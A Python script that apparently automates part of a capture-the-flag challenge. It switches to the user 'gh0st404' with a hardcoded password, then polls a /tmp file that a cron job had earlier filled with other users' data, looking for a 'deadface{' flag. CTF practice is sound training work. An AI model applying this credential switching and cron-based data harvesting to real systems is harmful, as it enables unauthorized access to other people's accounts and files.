"""Retry: reconnect, su gh0st404, read the lilith/mort1cia dump cron already wrote."""
import asyncio
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from find_flags import Shell  # noqa: E402

GHOST_PW = "Gh0stInTh3Sh3ll_404"


def ff_clean(s):
    import re
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    return s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "").strip()


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    return ff_clean("\n".join(l for l in buf.splitlines() if tag not in l)), ok


async def su_to(sh, user, password):
    await sh.send(f"su - {user}")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if not got:
        return False
    await sh.send(password)
    await asyncio.sleep(3.0)
    await sh.read(2.0)
    who, _ = await cmd(sh, "id", 25)
    return user in who


async def body(sh):
    await sh.read(5.0)
    if not await su_to(sh, "gh0st404", GHOST_PW):
        print("[!] su gh0st404 failed", flush=True)
        return
    print("as:", (await cmd(sh, "whoami"))[0], flush=True)

    for i in range(13):
        out, ok = await cmd(sh, "cat /tmp/lilith_dump.txt 2>/dev/null; echo scan_done", 30)
        if "cron-time:" in out or "deadface{" in out:
            print(f"[dump ready after ~{(i+1)*8}s]", flush=True)
            print(out, flush=True)
            return
        await asyncio.sleep(8)
    print("[!] still empty; listing /tmp", flush=True)
    print(await cmd(sh, "ls -la /tmp/; head -5 /opt/scrape/collect.sh", 15), flush=True)


async def main():
    for attempt in range(1, 6):
        try:
            async with Shell() as sh:
                await body(sh)
                return
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}: {e}", flush=True)
        await asyncio.sleep(8)


asyncio.run(main())
